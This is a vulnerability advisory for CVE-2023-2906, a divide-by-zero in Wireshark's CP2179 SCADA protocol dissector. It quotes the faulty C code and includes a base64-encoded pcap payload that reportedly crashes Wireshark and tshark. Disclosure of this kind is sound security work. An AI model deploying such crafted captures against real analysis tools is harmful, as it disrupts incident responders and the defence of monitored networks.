# CP2179 Parsing Divide By Zero

# Executive Summary

Due to a failure in validating the length provided by an attacker-crafted CP2179 packet, Wireshark versions 2.0.0 through 4.0.7, by default, is susceptible to a divide by zero allowing for a denial of service attack. [CVE-2023-2906] appears to be an instance of [CWE-369].

# Technical Details

As can be seen in the below code from the `dissect_response_frame` function which handles parsing the different types of response frames as part of the SCADA protocol, [PG&E 2179 Protocol](https://library.e.abb.com/public/9cc84999c2239e1fc125795d003d05f8/RER620_PGE2179prot_306957_ENa.pdf).

When parsing a `TIMETAG_INFO_RESPONSE` message, a call is made to the Wireshark function `tvb_get_guint8()` (on line 723) which retrieves an 8 bit value from the pcap file. If a 0 value is provided within the `TIMETAG_INFO_RESPONSE` message for the value, a divide by zero error occurs (on line 724).

The relevant code snippet from `epan/dissectors/packet-cp2179.c` is:

```
 718                 case TIMETAG_INFO_RESPONSE:
 719                 {
 720                     proto_tree_add_item(cp2179_proto_tree, hf_cp2179_timetag_moredata, tvb, offset, 1, ENC_LITTLE_ENDIAN);
 721                     proto_tree_add_item(cp2179_proto_tree, hf_cp2179_timetag_numsets, tvb, offset, 1, ENC_LITTLE_ENDIAN);
 722
 723                     num_records = tvb_get_guint8(tvb, offset) & 0x7F;
 724                     recordsize = (numberofcharacters-1) / num_records;
 725                     num_values = (recordsize-6) / 2;      /* Determine how many 16-bit analog values are present in each event record */
 726
 727                     offset += 1;
```

# Payload

A base64-encoded blob containing the pcap needed to trigger the vulnerability is provided below:

```
1MOyoQIABAAAAAAAAAAAAP9/AAD6AAAAAAAAAAAAAAAMAAAADAAAAAMAAAADAAAAAAAAAAAAAAAA
AAAAFAAAABQAAAABAAAAAQAAAAEAAAD5/wAAAAAAAAAAAAAAAAAADAAAAAwAAAADAAAAAwAAAAMA

```

# Attacker Value

By providing this poisoned set of packets, an attacker could crash the application (Wireshark, tshark, or a custom application utilizing libwireshark) preventing further analysis. Many security appliances capture packets as a matter of course for later analysis, and Wireshark is a common tool used by incident responders. This leads to situations where a specially crafted packet could be used to prevent best incident response practices from taking place.
